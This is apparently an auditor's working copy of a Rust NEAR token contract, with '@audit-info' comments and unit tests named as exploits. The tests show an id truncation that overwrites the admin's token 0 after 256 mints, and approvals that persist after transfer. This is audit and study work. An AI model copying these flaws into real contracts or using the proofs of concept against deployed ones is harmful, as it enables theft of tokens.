use near_sdk::store::LookupMap;
use near_sdk::{env, near, require, AccountId};

pub type Id = u8;

// #[derive(Debug)]
// @audit-info to check. how to make below value can be read for a return Contract instance
#[near(contract_state)]
 struct Contract {
    tokens: LookupMap<Id, AccountId>,
    approvals: LookupMap<Id, AccountId>,
    supply: u16,
}

// @audit-info inconsitancy between the init funciton and the following acitons
impl Default for Contract {
    fn default() -> Self {
        Self {
            tokens: {
                let mut a = LookupMap::new(b"tokens".to_vec());
                a.insert(0, "admin.near".parse().unwrap());
                a
            },
            approvals: LookupMap::new(b"approvals".to_vec()),
            supply: 1,
        }
    }
}

#[near]
impl Contract {
    #[init]
    #[private] // only callable by the contract's account
    //  @audit-info same code for default() ???  
    pub fn init(
        admin: AccountId
    ) -> Self {
        Self {
            tokens: {
                let mut a = LookupMap::new(b"tokens".to_vec());
                a.insert(0, admin);
                a
            },
            approvals: LookupMap::new(b"approvals".to_vec()),
            supply: 1,
        }
    }

    pub fn owner_of(&self, id: Id) -> Option<AccountId> {
        // check the clone usage whether or not is right?
        self.tokens.get(&id).cloned()
    }
    pub fn mint(&mut self) -> Id {
        // @audit-info self.supply.to_le_bytes()[0] only 1 bytes. u8
        self.tokens.insert(self.supply.to_le_bytes()[0], env::predecessor_account_id());
        let id = self.supply;
        self.supply += 1;
        id as Id
    }

    
    pub fn approve(&mut self, id: Id, delegatee: AccountId) {
        require!(self.tokens.get(&id).unwrap().clone() == env::predecessor_account_id(), "not owner!");
        self.approvals.insert(id, delegatee);
    }

    pub fn transfer(&mut self, id: Id, receiver: AccountId) {
        require!(
            self.tokens.get(&id).unwrap().clone() == env::predecessor_account_id()
            || self.approvals.get(&id).unwrap().clone() == env::predecessor_account_id()
            , "not owner!"
        );
        self.tokens.insert(id, receiver);
        // if self.approvals.get(&id).unwrap().clone() == env::predecessor_account_id() {
        //     self.approvals.remove(&id);
        // }
        
    }
}

#[cfg(test)]
mod tests {
    use near_sdk::{test_utils::VMContextBuilder, testing_env};
    use super::*;

    // cargo test -- --nocapture. show println!() value
    #[test]
    fn exploit_BobGetAdminToken() {
        let bob: AccountId = "bob.near".parse().unwrap();
        set_context(bob.clone());
        // init
        let admin: AccountId = "admin.near".parse().unwrap();
        let mut contract = Contract::init(admin.clone());
        assert_eq!(contract.owner_of(0).unwrap(), admin);

        println!("contract.owner_of(0) {:?}",contract.owner_of(0));

        for i in 1..=256
        {
            contract.mint();
        }
        println!("owner_of(255) {:?}",contract.owner_of(255));
        println!("contract.owner_of(0) {:?}",contract.owner_of(0));
        assert_eq!(contract.owner_of(0).unwrap(), admin);

        
    }

    #[test]
    fn exploit_ApproveRightAlwaysHold() {
        // init
        let bob: AccountId = "bob.near".parse().unwrap();
        let admin: AccountId = "admin.near".parse().unwrap();
        let mut contract = Contract::init(admin.clone());
        assert_eq!(contract.owner_of(0).unwrap(), admin);
        
        // tony mint tokenID = 1
        let tony: AccountId = "tony.near".parse().unwrap();
        set_context(tony.clone());
        contract.mint();
        println!("owner_of tokenID(1) {:?}",contract.owner_of(1));
        
        // Tony approve bob use tokenId = 1
        contract.approve(1,bob.clone());
        assert_eq!(contract.owner_of(1).unwrap(), tony);

        // Bob transfer tokenID to tom
        set_context(bob.clone());
        
        let tom: AccountId = "tom.near".parse().unwrap();
        // Bob transfer tokenId to himself
        contract.transfer(1, tom.clone());
        println!("owner_of tokenID(1){:?}",contract.owner_of(1));
        assert_eq!(contract.owner_of(1).unwrap(), tom.clone());

        // Bob can contine transfer tokenId to himself
        contract.transfer(1, bob.clone());
        println!("owner_of tokenID(1){:?}",contract.owner_of(1));
        assert_eq!(contract.owner_of(1).unwrap(), tom.clone());

    }

    #[test]
    fn exploit_AnyoneCanChangeStructValue() {
        
        let mut bob: AccountId = "bob.near".parse().unwrap();
        set_context(bob.clone());
        // init
        let admin: AccountId = "admin.near".parse().unwrap();
        let mut contract = Contract::init(admin.clone());
        assert_eq!(contract.owner_of(0).unwrap(), admin);

        println!("contract.supply {}",contract.supply);
        contract.mint();
        println!("contract.supply {}",contract.supply);
        contract.supply = 5; 
        println!("contract.supply {}",contract.supply);
        
    }

    // Auxiliar fn: create a mock context
    fn set_context(predecessor: AccountId) {
        let mut builder: VMContextBuilder = VMContextBuilder::new();
        builder.predecessor_account_id(predecessor);

        testing_env!(builder.build());
    }

}
